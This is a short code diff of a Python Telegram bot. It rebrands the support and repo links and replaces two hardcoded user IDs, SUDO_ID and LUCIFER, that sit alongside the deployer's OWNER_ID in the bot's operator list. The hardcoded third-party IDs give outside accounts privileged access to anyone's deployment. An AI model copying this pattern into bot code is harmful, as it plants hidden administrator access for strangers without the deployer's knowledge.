@@ -28,8 +28,8 @@ API_ID = int(os.getenv("API_ID", ""))
 API_HASH = os.getenv("API_HASH", "")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 OWNER_ID = os.getenv("OWNER_ID", "")
-SUDO_ID = "2007906120"
-LUCIFER = "2007906120"
+SUDO_ID = "6817437786"
+LUCIFER = "6817437786"
 COWNER_ID = "5738579437"
 OP  = [ int(OWNER_ID), int(SUDO_ID), int(COWNER_ID), int(LUCIFER)]
 #TelegramClient..
@@ -40,10 +40,10 @@ sree = TelegramClient(
 ).start(bot_token=BOT_TOKEN)
 
 Owner = "Ashish_Backed"
-repo = "https://t.me/Ashish_Backed"
+repo = "https://t.me/TEAM_EAGLE_OWNER"
 @sree.on(events.NewMessage(pattern="^/start"))
 async def start(event):
-    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/Ashish_Backed"), Button.url("••ʀєρο••", f'{repo}')]
+    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/TEAM_EAGLE_OWNER"), Button.url("••ʀєρο••", f'{repo}')]
     py = platform.python_version()
     if event.sender.id in OP:
         await sree.send_file(
@@ -77,7 +77,7 @@ async def start(event):
 
 @sree.on(events.NewMessage(pattern="^/help"))
 async def start(event):
-    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/Ashish_Backed"), Button.url("••ʀєρο••", f'{repo}')]
+    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/TEAM_EAGLE_OWNER"), Button.url("••ʀєρο••", f'{repo}')]
     py = platform.python_version()
     if event.sender.id in OP:
         await sree.send_file(
@@ -176,7 +176,7 @@ async def ver(events):
 
 
 print("Your Bot  Deployed Successfully ✅")
-print("JOIN @Ashish_Backed if you facing any kind of issue!!")
+print("JOIN @TEAM_EAGLE_OWNER if you facing any kind of issue!!")
 
 
 
